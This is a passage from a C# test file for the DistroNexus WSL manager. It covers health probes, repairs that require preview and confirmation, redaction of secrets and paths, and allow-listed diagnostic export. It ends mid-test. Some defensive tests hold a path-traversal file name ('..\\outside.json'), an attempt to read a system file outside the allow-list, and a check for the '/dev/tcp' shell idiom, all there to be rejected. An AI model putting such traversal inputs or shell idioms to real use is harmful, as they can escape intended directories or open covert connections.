using DistroNexus.Core.Interfaces;
using DistroNexus.Core.Models;
using DistroNexus.Core.Services;
using DistroNexus.Desktop.ViewModels;
using Microsoft.Extensions.DependencyInjection;
using Moq;

namespace DistroNexus.Tests.Services;

public sealed class HealthInitialAndRepairTests
{
    [Fact]
    public async Task RuntimeAdapter_UsesStructuredFixedWslArgumentsAndReportsFailedSystemdUnits()
    {
        var runner = new RecordingRunner(new ProcessResult(0, "failed.service loaded failed failed x", "", TimeSpan.Zero, false, false, false, 1));
        var adapter = new HealthRuntimeAdapter(runner);
        var context = new HealthCheckContext(Host(), [new WslInstance { Name = "Ubuntu", State = "Running" }]);
        var result = await adapter.ProbeSystemdAsync(context);
        Assert.Equal("failed", result["Ubuntu"].State);
        var request = Assert.Single(runner.Requests);
        Assert.Equal("wsl.exe", request.FileName);
        Assert.Equal(["--distribution", "Ubuntu", "--", "sh", "-lc", "systemctl --failed --no-legend --no-pager"], request.Arguments);
    }

    [Fact]
    public async Task RuntimeAdapter_NoRunningInstanceIsUnavailableWithReasonRatherThanHealthy()
    {
        var adapter = new HealthRuntimeAdapter(new RecordingRunner());
        var result = await adapter.ProbeNetworkAsync(new HealthCheckContext(Host(), []));
        Assert.All(result.Values, state => { Assert.Equal("unavailable", state.State); Assert.Contains("No running distribution", state.Detail); });
    }

    [Fact]
    public async Task RuntimeAdapter_ReportsStoppedStartupAndUsesInstanceVhdxSizeForStorageEvidence()
    {
        var adapter = new HealthRuntimeAdapter(new RecordingRunner(
            new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1),
            new ProcessResult(0, "/dev/sda 1000 400 600 40% /\n", "", TimeSpan.Zero, false, false, false, 1)));
        var context = new HealthCheckContext(Host(), [
            new WslInstance { Name = "running", State = "Running", Size = 1_000_000 },
            new WslInstance { Name = "starting", State = "Installing" }]);

        var systemd = await adapter.ProbeSystemdAsync(context);
        var storage = await adapter.ProbeStorageAsync(context);

        Assert.Equal("warning", systemd["startup:starting"].State);
        Assert.Equal(1_000_000, storage["linux:running"].VhdxBytes);
        Assert.Equal(600 * 1024, storage["linux:running"].LinuxFilesystemFreeBytes);
        Assert.NotNull(storage["linux:running"].ReclaimableBytes);
        Assert.Contains("not running", storage["linux:starting"].Detail, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task DistributionConfigurationHealthCheck_ReportsStoppedDistributionAsNotReadWithoutStartingIt()
    {
        var configuration = new Mock<IDistributionConfigurationService>(MockBehavior.Strict);
        var context = new HealthCheckContext(Host(), [new WslInstance { Name = "Ubuntu", State = "Stopped" }]);

        var result = await new DistributionConfigurationHealthCheck(configuration.Object).CheckAsync(context, CancellationToken.None);

        var finding = Assert.Single(result.Findings);
        Assert.Equal("wslconf.Ubuntu.unavailable", finding.Id);
        Assert.Equal(HealthSeverity.Information, finding.Severity);
        Assert.Equal("not-started", finding.Evidence!["probe"]);
        Assert.Contains("stopped", finding.Detail, StringComparison.OrdinalIgnoreCase);
        configuration.Verify(x => x.ReadAsync(It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
    }
    [Fact]
    public async Task InitialProbe_MapsFixtureFailuresAndUnavailableStorageHonestly()
    {
        var fixture = new HealthProbeSnapshot(
            new Dictionary<string, HealthProbeState> { ["dns"] = new("failed", "DNS failed"), ["proxy"] = new("healthy", "ok") },
            new Dictionary<string, HealthProbeState> { ["ssh"] = new("failed", "unit failed") },
            new Dictionary<string, BackupHealthState> { ["ubuntu"] = new(false, null, 2, "missing") },
            new Dictionary<string, TemplateHealthState> { ["ubuntu"] = new("failed", "template failed") },
            new Dictionary<string, StorageHealthState> { ["C:"] = new(10, 100, null, null, null, "adapters unavailable") });
        var probe = new Mock<IHealthProbe>(); probe.Setup(x => x.ProbeAsync(It.IsAny<HealthCheckContext>(), It.IsAny<CancellationToken>())).ReturnsAsync(fixture);
        var result = await new InitialProbeHealthCheck(probe.Object).CheckAsync(Context(), default);
        Assert.Equal(HealthSeverity.Critical, result.Findings.Single(x => x.Id == "network.dns").Severity);
        Assert.Equal(HealthSeverity.Warning, result.Findings.Single(x => x.Id == "backup.ubuntu").Severity);
        Assert.Equal("unavailable", result.Findings.Single(x => x.Id == "storage.C:").Evidence!["vhdxBytes"]);
    }

    [Fact]
    public async Task Repair_RequiresMatchingCorePreviewAndConfirmation()
    {
        var action = new Mock<IRepairAction>(); action.SetupGet(x => x.Id).Returns("r");
        action.Setup(x => x.PreviewAsync(It.IsAny<HealthFinding>(), It.IsAny<CancellationToken>())).ReturnsAsync(new RepairPreview("r", "r", RepairSafety.RequiresConfirmation, RepairIdempotency.Idempotent, ["change"], []));
        action.Setup(x => x.ExecuteAsync(It.IsAny<HealthFinding>(), It.IsAny<CancellationToken>())).ReturnsAsync(new RepairResult("r", true, ["done"]));
        var service = new HealthRepairService([action.Object]); var finding = new HealthFinding("f", HealthSeverity.Warning, HealthScope.Host, "t", "d", RepairId: "r");
        var preview = await service.PreviewAsync(finding);
        Assert.False((await service.ExecuteAsync(finding, new RepairExecutionRequest(preview.PreviewToken!, false))).Succeeded);
        preview = await service.PreviewAsync(finding);
        Assert.True((await service.ExecuteAsync(finding, new RepairExecutionRequest(preview.PreviewToken!, true))).Succeeded);
        action.Verify(x => x.ExecuteAsync(finding, It.IsAny<CancellationToken>()), Times.Once);
    }

    [Fact]
    public async Task FixedProcessRepair_UsesFixedStructuredArgumentsOnlyAfterConfirmedPreview()
    {
        var runner = new RecordingRunner(new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1));
        var action = new FixedProcessRepairAction("wsl.trim", "Trim", RepairSafety.PrivilegedOrDisruptive, RepairIdempotency.Idempotent, ["trim"],
            finding => string.IsNullOrWhiteSpace(finding.InstanceName) ? null : new ProcessRequest("wsl.exe", ["--distribution", finding.InstanceName, "--", "sudo", "--non-interactive", "fstrim", "-av"], TimeSpan.FromSeconds(10)), runner);
        var service = new HealthRepairService([action]);
        var finding = new HealthFinding("storage.ubuntu", HealthSeverity.Warning, HealthScope.Instance, "Storage", "trim", "Ubuntu", "wsl.trim");

        var preview = await service.PreviewAsync(finding);
        Assert.Contains("wsl.exe --distribution Ubuntu", Assert.Single(preview.Commands));
        var denied = await service.ExecuteAsync(finding, new RepairExecutionRequest(preview.PreviewToken!, false));
        Assert.False(denied.Succeeded); Assert.Contains("DN-7003", denied.Error); Assert.Empty(runner.Requests);
        preview = await service.PreviewAsync(finding);
        var result = await service.ExecuteAsync(finding, new RepairExecutionRequest(preview.PreviewToken!, true));
        Assert.True(result.Succeeded);
        Assert.Equal(["--distribution", "Ubuntu", "--", "sudo", "--non-interactive", "fstrim", "-av"], Assert.Single(runner.Requests).Arguments);
    }

    [Fact]
    public async Task FixedProcessRepair_ReprobesReadOnlyAndNeverConvertsACompletedRepairIntoFalseFailure()
    {
        var runner = new RecordingRunner(
            new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1),
            new ProcessResult(null, "", "probe unavailable", TimeSpan.Zero, false, false, false, null, ProcessFailureKind.StartFailed));
        var action = new FixedProcessRepairAction("wsl.update", "Update", RepairSafety.Safe, RepairIdempotency.Idempotent, ["update"],
            _ => new ProcessRequest("wsl.exe", ["--update"], TimeSpan.FromSeconds(10)), runner,
            _ => new ProcessRequest("wsl.exe", ["--version"], TimeSpan.FromSeconds(10)));

        var result = await action.ExecuteAsync(new HealthFinding("wsl.update.pending", HealthSeverity.Warning, HealthScope.Host, "WSL update", "pending", RepairId: "wsl.update"));

        Assert.True(result.Succeeded);
        Assert.False(result.PostconditionSatisfied);
        Assert.Contains(result.Results, x => x.Contains("could not be verified", StringComparison.OrdinalIgnoreCase));
        Assert.Equal(["--update"], runner.Requests[0].Arguments);
        Assert.Equal(["--version"], runner.Requests[1].Arguments);
    }

    [Fact]
    public async Task ElevationRepair_IsExplicitlyUnavailableWithoutElevatedConsent()
    {
        var action = new ElevationRequiredRepairAction();
        var result = await action.ExecuteAsync(new HealthFinding("feature", HealthSeverity.Warning, HealthScope.Host, "Feature", "missing", RepairId: action.Id));
        Assert.False(result.Succeeded); Assert.Contains("DN-7004", result.Error);
    }

    [Fact]
    public async Task ElevatedWindowsFeatureRepair_UsesOneAllowListedUacOperationPerFeature()
    {
        var enabled = new ProcessResult(0, "State : Enabled", "", TimeSpan.Zero, false, false, false, 1);
        var runner = new RecordingRunner(Enumerable.Repeat(enabled, WindowsPrerequisiteProbe.RequiredFeatures.Length * 2).ToArray());
        var broker = new ElevatedWindowsFeatureRepairBroker(runner);

        var result = await broker.StartAsync(new HealthFinding("windows.features", HealthSeverity.Warning, HealthScope.Host, "Features", "missing", RepairId: "enable.windows-features"));

        Assert.True(result.Succeeded);
        Assert.True(result.PostconditionSatisfied);
        Assert.Equal(WindowsPrerequisiteProbe.RequiredFeatures.Length * 2, runner.Requests.Count);
        foreach (var (request, feature) in runner.Requests.Take(WindowsPrerequisiteProbe.RequiredFeatures.Length).Zip(WindowsPrerequisiteProbe.RequiredFeatures))
        {
            Assert.Equal("powershell.exe", request.FileName);
            Assert.Equal(["-NoProfile", "-NonInteractive", "-Command"], request.Arguments.Take(3));
            Assert.Contains("/FeatureName:" + feature, request.Arguments[3], StringComparison.Ordinal);
            Assert.DoesNotContain(WindowsPrerequisiteProbe.RequiredFeatures.Where(other => other != feature), other => request.Arguments[3].Contains("/FeatureName:" + other, StringComparison.Ordinal));
        }
        foreach (var (request, feature) in runner.Requests.Skip(WindowsPrerequisiteProbe.RequiredFeatures.Length).Zip(WindowsPrerequisiteProbe.RequiredFeatures))
        {
            Assert.Equal("dism.exe", request.FileName);
            Assert.Equal(["/Online", "/Get-FeatureInfo", "/FeatureName:" + feature], request.Arguments);
        }
        Assert.All(runner.Requests.Take(WindowsPrerequisiteProbe.RequiredFeatures.Length), request =>
        {
            Assert.Contains("-PassThru", request.Arguments[3], StringComparison.Ordinal);
            Assert.Contains("exit $p.ExitCode", request.Arguments[3], StringComparison.Ordinal);
        });
    }

    [Fact]
    public async Task ElevatedWindowsFeatureRepair_FailsWhenReadOnlyFeatureRequeryDoesNotProveEnabled()
    {
        var runner = new RecordingRunner(
            new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1),
            new ProcessResult(0, "State : Disabled", "", TimeSpan.Zero, false, false, false, 1));
        var result = await new ElevatedWindowsFeatureRepairBroker(runner).StartAsync(
            new HealthFinding("windows.feature", HealthSeverity.Warning, HealthScope.Host, "Feature", "missing", RepairId: "enable.windows-features",
                Evidence: new Dictionary<string, string> { ["feature"] = WindowsPrerequisiteProbe.RequiredFeatures[0] }));
        Assert.False(result.Succeeded);
        Assert.False(result.PostconditionSatisfied);
    }

    [Fact]
    public async Task WslRestartRepair_UsesInstanceStateForPostconditionWithoutStartingDistribution()
    {
        var manager = new Mock<IWslManagerService>();
        manager.Setup(x => x.GetInstancesAsync(It.IsAny<CancellationToken>()))
            .ReturnsAsync([new WslInstance { Name = "Ubuntu", State = "Stopped" }]);
        var runner = new RecordingRunner(new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1));
        var action = new WslRestartRepairAction(manager.Object, runner);

        var result = await action.ExecuteAsync(new HealthFinding("wsl.restart", HealthSeverity.Warning, HealthScope.Host, "WSL", "restart", RepairId: action.Id));

        Assert.True(result.Succeeded);
        Assert.True(result.PostconditionSatisfied);
        Assert.Single(runner.Requests);
        Assert.Equal(["--shutdown"], runner.Requests[0].Arguments);
        manager.Verify(x => x.GetInstancesAsync(It.IsAny<CancellationToken>()), Times.Once);
    }

    [Fact]
    public async Task RuntimeAdapter_MirroredModeAvoidsNatGatewayProbeAndUsesRouteEvidence()
    {
        var source = LosslessIniDocument.Parse(System.Text.Encoding.UTF8.GetBytes("[wsl2]\nnetworkingMode=mirrored\n"));
        var configuration = new Mock<IWslConfigurationService>();
        configuration.Setup(x => x.ReadAsync(It.IsAny<CancellationToken>())).ReturnsAsync(
            new ConfigurationDocument<WslConfigurationSettings>(new(new Dictionary<string, string> { ["wsl2.networkingMode"] = "mirrored" }), source, [], 0, "fixture", RestartScope.Wsl, source.ToString()));
        var runner = new RecordingRunner(
            new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1),
            new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1),
            new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1),
            new ProcessResult(0, "not-configured", "", TimeSpan.Zero, false, false, false, 1),
            new ProcessResult(1, "", "no address", TimeSpan.Zero, false, false, false, 1));
        var adapter = new HealthRuntimeAdapter(runner, configuration.Object);

        var states = await adapter.ProbeNetworkAsync(new HealthCheckContext(Host(), [new WslInstance { Name = "Ubuntu", State = "Running" }]));

        Assert.Equal("mirrored", states["mode"].Evidence!["networkingMode"]);
        Assert.Contains("route and interface", states["wsl-to-windows"].Detail, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain(runner.Requests, request => request.Arguments.Last().Contains("gateway=$(ip route", StringComparison.Ordinal));
        Assert.Contains(runner.Requests, request => request.Arguments.Last().Contains("ip route | grep", StringComparison.Ordinal));
    }

    [Fact]
    public async Task RuntimeAdapter_LocalhostForwardingWithoutEndpointReportsSettingAndDoesNotGuessAPort()
    {
        var source = LosslessIniDocument.Parse(System.Text.Encoding.UTF8.GetBytes("[wsl2]\nlocalhostForwarding=true\n"));
        var configuration = new Mock<IWslConfigurationService>();
        configuration.Setup(x => x.ReadAsync(It.IsAny<CancellationToken>())).ReturnsAsync(
            new ConfigurationDocument<WslConfigurationSettings>(new(new Dictionary<string, string> { ["wsl2.localhostForwarding"] = "true" }), source, [], 0, "fixture", RestartScope.Wsl, source.ToString()));
        var runner = new RecordingRunner(Enumerable.Repeat(new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1), 8).ToArray());
        var adapter = new HealthRuntimeAdapter(runner, configuration.Object);

        var states = await adapter.ProbeNetworkAsync(new HealthCheckContext(Host(), [new WslInstance { Name = "Ubuntu", State = "Running" }]));

        Assert.Equal("healthy", states["localhost-forwarding-setting"].State);
        Assert.Equal("enabled", states["localhost-forwarding-setting"].Evidence!["localhostForwarding"]);
        Assert.Equal("information", states["localhost-forwarding"].State);
        Assert.Equal("required", states["localhost-forwarding"].Evidence!["endpoint"]);
        Assert.Equal("not-run", states["localhost-forwarding"].Evidence!["probe"]);
        Assert.Contains("no application port was guessed", states["localhost-forwarding"].Detail, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain(runner.Requests, request => request.Arguments.Any(argument => argument.Contains("/dev/tcp", StringComparison.Ordinal) || argument.Contains("port 22", StringComparison.OrdinalIgnoreCase)));
    }

    [Fact]
    public async Task DefaultHealthProbe_UsesImmutableFailedTemplateSnapshotInsteadOfCurrentCatalog()
    {
        var templates = new Mock<ITemplateService>();
        templates.Setup(x => x.GetApplicationHistoryAsync(It.IsAny<string?>())).ReturnsAsync([
            new TemplateApplicationRecord
            {
                Id = "application-1", TemplateId = "retired-template", InstanceName = "Ubuntu", Success = true,
                DeclaredHealthSnapshot = new TemplateDeclaredHealthSnapshot(false, ["Required preflight declaration is incomplete: bootstrap"], ["bootstrap"], ["bootstrap"], "1.0")
            }]);
        var backups = new Mock<IBackupHealthSource>();
        backups.Setup(x => x.GetHealthAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new Dictionary<string, BackupHealthState>());
        var runtime = new Mock<IHealthRuntimeAdapter>();
        runtime.Setup(x => x.ProbeNetworkAsync(It.IsAny<HealthCheckContext>(), It.IsAny<CancellationToken>())).ReturnsAsync(new Dictionary<string, HealthProbeState>());
        runtime.Setup(x => x.ProbeSystemdAsync(It.IsAny<HealthCheckContext>(), It.IsAny<CancellationToken>())).ReturnsAsync(new Dictionary<string, HealthProbeState>());
        runtime.Setup(x => x.ProbeStorageAsync(It.IsAny<HealthCheckContext>(), It.IsAny<CancellationToken>())).ReturnsAsync(new Dictionary<string, StorageHealthState>());

        var snapshot = await new DefaultHealthProbe(backups.Object, templates.Object, runtime.Object).ProbeAsync(Context());

        var template = Assert.Single(snapshot.Templates);
        Assert.Equal("application-1", template.Key);
        Assert.Equal("failed", template.Value.DeclaredState);
        Assert.Contains("bootstrap", template.Value.Detail, StringComparison.Ordinal);
        templates.Verify(x => x.GetTemplateByIdAsync(It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
    }

    [Fact]
    public async Task TemplateHealthCheck_ReportsPostInstallContractDriftFromImmutableSnapshot()
    {
        var templates = new Mock<ITemplateService>();
        templates.Setup(x => x.GetApplicationHistoryAsync(It.IsAny<string?>())).ReturnsAsync([
            new TemplateApplicationRecord
            {
                Id = "install-1", TemplateId = "dev", InstanceName = "Ubuntu", Success = true,
                DeclaredHealthSnapshot = new TemplateDeclaredHealthSnapshot(true, [], ["bootstrap"], ["bootstrap"], "2.0", ["bootstrap", "validate"], ["bootstrap"])
            }]);

        var result = await new TemplateHealthCheck(templates.Object).CheckAsync(Context(), default);

        var drift = Assert.Single(result.Findings);
        Assert.Equal("template.install-1.postinstall", drift.Id);
        Assert.Equal(HealthSeverity.Warning, drift.Severity);
        Assert.Contains("validate", drift.Detail, StringComparison.Ordinal);
        Assert.Equal("1", drift.Evidence!["missingScriptCount"]);
    }

    [Fact]
    public async Task TemplateHealthCheck_DoesNotRunRuntimePreflightForStoppedOrMissingInstance()
    {
        var templates = new Mock<ITemplateService>();
        templates.Setup(x => x.GetApplicationHistoryAsync()).ReturnsAsync([
            new TemplateApplicationRecord { Id = "stopped", TemplateId = "dev", InstanceName = "Stopped", Success = true, DeclaredHealthSnapshot = new TemplateDeclaredHealthSnapshot(true, [], [], [], "1", RuntimePreflightContracts: [new("check", true, "test -f /etc/os-release")]) },
            new TemplateApplicationRecord { Id = "missing", TemplateId = "dev", InstanceName = "Missing", Success = true, DeclaredHealthSnapshot = new TemplateDeclaredHealthSnapshot(true, [], [], [], "1", RuntimePreflightContracts: [new("check", true, "test -f /etc/os-release")]) }
        ]);
        var evaluator = new Mock<ITemplateRuntimePreflightEvaluator>();

        var result = await new TemplateHealthCheck(templates.Object, evaluator.Object).CheckAsync(new HealthCheckContext(Host(), [new WslInstance { Name = "Stopped", State = "Stopped" }]), default);

        Assert.Equal(2, result.Findings.Count(x => x.Id.EndsWith(".preflight.check", StringComparison.Ordinal)));
        Assert.All(result.Findings.Where(x => x.Id.EndsWith(".preflight.check", StringComparison.Ordinal)), x => Assert.Equal("unavailable", x.Evidence!["state"]));
        evaluator.Verify(x => x.EvaluateAsync(It.IsAny<TemplateApplicationRecord>(), It.IsAny<CancellationToken>()), Times.Never);
    }

    [Fact]
    public async Task HealthCenterViewModel_RepairReportsBusyAndForwardsCancellationToken()
    {
        var finding = new HealthFinding("config.test", HealthSeverity.Warning, HealthScope.Host, "Test", "detail", RepairId: "config.global");
        var module = SupportedCapabilities();
        module.Setup(x => x.GetHealthRepairPreviewAsync(finding, It.IsAny<CancellationToken>()))
            .ReturnsAsync(new RepairPreview("config.global", "Fix", RepairSafety.Safe, RepairIdempotency.Idempotent, [], [], PreviewToken: "token"));
        var started = new TaskCompletionSource(TaskCreationOptions.RunContinuationsAsynchronously);
        module.Setup(x => x.RepairHealthAsync("token", It.IsAny<CancellationToken>()))
            .Returns<string, CancellationToken>(async (_, token) => { started.TrySetResult(); await Task.Delay(Timeout.InfiniteTimeSpan, token); return default!; });
        using var viewModel = new HealthCenterViewModel(module.Object);

        var task = viewModel.RepairCommand.ExecuteAsync(new HealthFindingViewModel(finding));
        await started.Task.WaitAsync(TimeSpan.FromSeconds(5));
        Assert.True(viewModel.IsRepairing); Assert.True(viewModel.IsBusy); Assert.False(viewModel.CanRunHealthActions);
        viewModel.CancelRepairCommand.Execute(null);
        await task;

        Assert.False(viewModel.IsRepairing);
        Assert.Contains("cancel", viewModel.Status, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SettingsLocalhostForwardingEndpointStrategy_UsesOnlyExplicitTypedLoopbackEndpoint()
    {
        var settings = new Mock<ISettingsService>();
        settings.Setup(x => x.LoadSettings()).Returns(new GlobalSettings { LocalhostForwardingHealthEndpoint = "127.0.0.1:48123" });
        var strategy = new SettingsLocalhostForwardingEndpointStrategy(settings.Object);
        var endpoint = strategy.GetEndpoint(Context(), "nat");
        Assert.Equal(new HealthTcpEndpoint("127.0.0.1", 48123), endpoint);

        settings.Setup(x => x.LoadSettings()).Returns(new GlobalSettings { LocalhostForwardingHealthEndpoint = "example.com:443" });
        Assert.False(strategy.GetEndpoint(Context(), "nat")!.IsValid);
    }

    [Theory]
    [InlineData("nat", true, false)]
    [InlineData("mirrored", false, true)]
    [InlineData("virtioproxy", false, true)]
    [InlineData("none", false, false)]
    public async Task RuntimeAdapter_NetworkModesUseOnlyTheirApplicableConnectivityProbe(string mode, bool expectsNatGateway, bool expectsRouteProbe)
    {
        var source = LosslessIniDocument.Parse(System.Text.Encoding.UTF8.GetBytes("[wsl2]\nnetworkingMode=" + mode + "\n"));
        var configuration = new Mock<IWslConfigurationService>();
        configuration.Setup(x => x.ReadAsync(It.IsAny<CancellationToken>())).ReturnsAsync(
            new ConfigurationDocument<WslConfigurationSettings>(new(new Dictionary<string, string> { ["wsl2.networkingMode"] = mode }), source, [], 0, "fixture", RestartScope.Wsl, source.ToString()));
        var runner = new RecordingRunner(Enumerable.Repeat(new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1), 8).ToArray());
        var adapter = new HealthRuntimeAdapter(runner, configuration.Object);

        var states = await adapter.ProbeNetworkAsync(new HealthCheckContext(Host(), [new WslInstance { Name = "Ubuntu", State = "Running" }]));

        Assert.Equal(mode, states["mode"].Evidence!["networkingMode"]);
        Assert.Equal(expectsNatGateway, runner.Requests.Any(x => x.Arguments.Last().Contains("gateway=$(ip route", StringComparison.Ordinal)));
        Assert.Equal(expectsRouteProbe, runner.Requests.Any(x => x.Arguments.Last().Contains("ip route | grep", StringComparison.Ordinal)));
        if (mode == "none") Assert.Equal("unavailable", states["dns"].State);
    }

    [Fact]
    public async Task FixedProcessRepair_ReportsVerifiedPostconditionAfterSuccessfulReadOnlyReprobe()
    {
        var runner = new RecordingRunner(
            new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1),
            new ProcessResult(0, "2.5.0", "", TimeSpan.Zero, false, false, false, 1));
        var action = new FixedProcessRepairAction("wsl.update", "Update", RepairSafety.Safe, RepairIdempotency.Idempotent, ["update"],
            _ => new ProcessRequest("wsl.exe", ["--update"], TimeSpan.FromSeconds(10)), runner,
            _ => new ProcessRequest("wsl.exe", ["--version"], TimeSpan.FromSeconds(10)));

        var result = await action.ExecuteAsync(new HealthFinding("wsl.update.pending", HealthSeverity.Warning, HealthScope.Host, "WSL update", "pending", RepairId: "wsl.update"));

        Assert.True(result.Succeeded);
        Assert.True(result.PostconditionSatisfied);
        Assert.Equal(["--update"], runner.Requests[0].Arguments);
        Assert.Equal(["--version"], runner.Requests[1].Arguments);
    }

    [Fact]
    public void Redaction_RemovesWindowsLinuxPathsAndSecrets()
    {
        var value = SensitiveDataRedactor.Redact("token=very-secret C:\\Users\\alice\\x /home/alice/.ssh");
        Assert.DoesNotContain("very-secret", value); Assert.DoesNotContain("alice", value); Assert.DoesNotContain("C:\\Users", value);
    }
    [Fact]
    public async Task BackupHealthSource_UsesPersistedTypedFailureHistoryAndFreeSpace()
    {
        var backups = new Mock<IBackupService>();
        backups.Setup(x => x.GetSchedulesAsync(It.IsAny<CancellationToken>())).ReturnsAsync([new BackupSchedule { Name = "ubuntu", Destination = Path.GetTempPath() }]);
        backups.Setup(x => x.GetHealthHistoryAsync(It.IsAny<CancellationToken>())).ReturnsAsync([new BackupHealthRecord("ubuntu", DateTimeOffset.UtcNow, false, "DN-Test"), new BackupHealthRecord("ubuntu", DateTimeOffset.UtcNow.AddMinutes(-1), false, "DN-Test")]);
        var state = await new BackupHealthSource(backups.Object).GetHealthAsync();
        Assert.Equal(2, state["ubuntu"].ConsecutiveFailures);
        Assert.NotNull(state["ubuntu"].FreeBytes);
    }

    [Fact]
    public async Task BackupHealthSource_RecordUsesTheBackupServiceAuthoritativeStoreAndRedactsDetails()
    {
        var backups = new Mock<IBackupService>();
        backups.Setup(x => x.RecordHealthAsync(It.IsAny<BackupHealthRecord>(), It.IsAny<CancellationToken>())).Returns(Task.CompletedTask);
        var source = new BackupHealthSource(backups.Object);

        await source.RecordAsync(new BackupHealthRecord("ubuntu", DateTimeOffset.UtcNow, false, "DN-4006", "token=do-not-export C:\\Users\\alice\\backup"));

        backups.Verify(x => x.RecordHealthAsync(It.Is<BackupHealthRecord>(record =>
            record.InstanceName == "ubuntu" && !record.Detail!.Contains("do-not-export", StringComparison.Ordinal) && !record.Detail.Contains("alice", StringComparison.Ordinal)),
            It.IsAny<CancellationToken>()), Times.Once);
    }

    [Fact]
    public async Task DiagnosticProviders_ReadOnlyAllowListedApplicationLogAndReturnRedactedStructuredErrors()
    {
        var directory = Path.Combine(Path.GetTempPath(), "DistroNexusTests", Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(directory);
        try
        {
            var log = Path.Combine(directory, "DistroNexus_20260712.log");
            await File.WriteAllTextAsync(log, "{\"time\":\"2026-07-12T10:00:00Z\",\"level\":\"ERROR\",\"logger\":\"backup\",\"errorCode\":\"4006\",\"message\":\"token=private C:\\\\Users\\\\alice\"}\n");
            var settings = new Mock<ISettingsService>();
            settings.Setup(x => x.LoadSettings()).Returns(new GlobalSettings { LogPath = directory });
            var logs = new ApplicationDiagnosticLogProvider(settings.Object);
            var id = Assert.Single(logs.AllowedLogIds);

            var content = await logs.ReadAsync(id, 4096);
            var errors = await new StructuredFileErrorProvider(logs).GetRecentAsync(10);

            Assert.DoesNotContain("private", content); Assert.DoesNotContain("alice", content);
            var error = Assert.Single(errors); Assert.Equal("DN-4006", error.Code); Assert.DoesNotContain("private", error.Message);
            await Assert.ThrowsAsync<InvalidOperationException>(() => logs.ReadAsync("C:\\Windows\\win.ini", 10));
        }
        finally { Directory.Delete(directory, true); }
    }

    [Fact]
    public async Task DiagnosticReport_PreviewsAndExportsSelectedAllowListedDataWithStrictRedaction()
    {
        var health = new Mock<IHealthOrchestrator>();
        health.Setup(x => x.ScanAsync(It.IsAny<IProgress<HealthFinding>>(), It.IsAny<CancellationToken>())).ReturnsAsync(new HealthScanResult(Guid.NewGuid(), DateTimeOffset.UtcNow, DateTimeOffset.UtcNow, [new HealthFinding("f", HealthSeverity.Warning, HealthScope.Host, "title", "C:\\Users\\alice\\secret") ]));
        var capabilities = new Mock<IPlatformCapabilityService>(); capabilities.Setup(x => x.GetHostSnapshotAsync(It.IsAny<bool>(), It.IsAny<CancellationToken>())).ReturnsAsync(Host());
        var logs = new Mock<IDiagnosticLogProvider>(); logs.SetupGet(x => x.AllowedLogIds).Returns(["app:test"]); logs.Setup(x => x.ReadAsync("app:test", It.IsAny<int>(), It.IsAny<CancellationToken>())).ReturnsAsync("token=private /home/alice/.config");
        var errors = new Mock<IStructuredErrorProvider>(); errors.Setup(x => x.GetRecentAsync(It.IsAny<int>(), It.IsAny<CancellationToken>())).ReturnsAsync([new StructuredErrorRecord(DateTimeOffset.UtcNow, "DN-7005", "repair", "password=private C:\\Users\\alice")]);
        var exportDirectory = Path.Combine(Path.GetTempPath(), "DistroNexus-report-" + Guid.NewGuid().ToString("N"));
        var report = new DiagnosticReportService(health.Object, capabilities.Object, logs.Object, errors.Object, exportDirectory);
        var fileName = "report.json";
        var path = Path.Combine(exportDirectory, fileName);
        try
        {
            var preview = await report.PreviewAsync(new DiagnosticReportRequest(DiagnosticReportFormat.Json, true, ["app:test"]));
            var exported = await report.ExportAsync(new DiagnosticReportRequest(DiagnosticReportFormat.Json, true, ["app:test"], preview.SnapshotToken), fileName);
            Assert.DoesNotContain("private", preview.Content); Assert.DoesNotContain("alice", preview.Content); Assert.DoesNotContain("C:\\Users", preview.Content);
            Assert.True(preview.Selection!.IsRedacted); Assert.Equal(["app:test"], preview.Selection.SelectedLogIds);
            Assert.Equal(fileName, exported); Assert.DoesNotContain(exportDirectory, exported, StringComparison.OrdinalIgnoreCase); Assert.Equal(preview.Content, await File.ReadAllTextAsync(path));
            await Assert.ThrowsAsync<InvalidOperationException>(() => report.ExportAsync(new DiagnosticReportExportRequest(preview.SnapshotToken, fileName)));
            var unsafePreview = await report.PreviewAsync(new DiagnosticReportRequest(DiagnosticReportFormat.Json, true));
            await Assert.ThrowsAsync<InvalidOperationException>(() => report.ExportAsync(new DiagnosticReportExportRequest(unsafePreview.SnapshotToken, "..\\outside.json")));
            var extensionPreview = await report.PreviewAsync(new DiagnosticReportRequest(DiagnosticReportFormat.Json, true));
            await Assert.ThrowsAsync<InvalidOperationException>(() => report.ExportAsync(new DiagnosticReportExportRequest(extensionPreview.SnapshotToken, "report.md")));
            var replaySafe = await report.ExportAsync(new DiagnosticReportExportRequest(extensionPreview.SnapshotToken, "report.json"));
            Assert.Equal("report.json", replaySafe.DestinationFileName); Assert.Equal("DistroNexusDiagnostics", replaySafe.Location);
            await Assert.ThrowsAsync<InvalidOperationException>(() => report.ExportAsync(new DiagnosticReportRequest(DiagnosticReportFormat.Json, true), "report.md"));
        }
        finally { if (Directory.Exists(exportDirectory)) Directory.Delete(exportDirectory, true); }
    }

    [Fact]
    public async Task DiagnosticReport_PreviewForwardsCancellationToCoreProviders()
    {
        using var cancellation = new CancellationTokenSource(); cancellation.Cancel();
        var health = new Mock<IHealthOrchestrator>();
        var capabilities = new Mock<IPlatformCapabilityService>();
        capabilities.Setup(x => x.GetHostSnapshotAsync(It.IsAny<bool>(), It.IsAny<CancellationToken>()))
            .Returns<bool, CancellationToken>((_, token) => Task.FromCanceled<PlatformCapabilitySnapshot>(token));
